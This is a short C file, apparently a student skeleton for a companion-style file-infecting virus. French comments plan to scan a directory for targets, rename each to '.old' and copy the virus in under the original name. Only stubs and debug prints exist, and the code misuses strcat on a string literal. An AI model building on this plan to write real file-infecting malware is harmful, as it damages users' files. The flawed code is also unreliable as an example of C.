#include <stdio.h>
#include <stdbool.h>
#include <string.h>

void copy_virus(char *fileName);
bool alreadyInfected(char *fileName);

int main(int argc, char const *argv[])
{
    copy_virus("programme_1");
}

void copy_virus(char *fileName){
    if (!alreadyInfected(fileName)) {
        printf("YES");
        if (rename(fileName,strcat(fileName,".old"))) {
            printf("salut");
        }
    }
}

bool alreadyInfected(char *fileName){
    return false;
}

// Clément : Ouvrir le répertoire, accéder aux fichiers, récupération de leurs statut, afficher le nom des fichiers qui correspondent à la cible.
// Benjamin : Modifier le nom du fichier, crée une copie du virus avec le nom du fichier.